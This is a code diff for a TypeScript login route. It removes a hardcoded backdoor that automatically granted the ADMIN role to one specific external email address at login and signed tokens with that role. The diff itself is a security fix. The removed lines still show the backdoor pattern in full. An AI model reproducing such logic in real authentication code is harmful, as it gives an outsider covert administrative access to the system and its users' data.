@@ -101,16 +101,8 @@ router.post("/login", async (req: Request, res: Response) => {
   const valid = await verifyPassword(password, user.passwordHash)
   if (!valid) return res.status(401).json({ error: "Invalid credentials" })
 
-  // Ensure special admin email always has ADMIN role (in case account existed before rule)
-  let effectiveRole = user.role
-  const special = email.trim().toLowerCase() === "qynon@mail.ru"
-  if (special && user.role !== "ADMIN") {
-    await prisma.user.update({ where: { id: user.id }, data: { role: "ADMIN" } })
-    effectiveRole = "ADMIN" as any
-  }
-
-  const accessToken = signAccessToken(user.id, effectiveRole)
-  const refreshToken = signRefreshToken(user.id, effectiveRole)
+  const accessToken = signAccessToken(user.id, user.role)
+  const refreshToken = signRefreshToken(user.id, user.role)
 
   await prisma.session.create({
     data: {
@@ -126,7 +118,7 @@ router.post("/login", async (req: Request, res: Response) => {
     user: {
       id: user.id,
       email: user.email,
-      role: effectiveRole,
+      role: user.role,
       fullName: user.fullName,
     },
   })
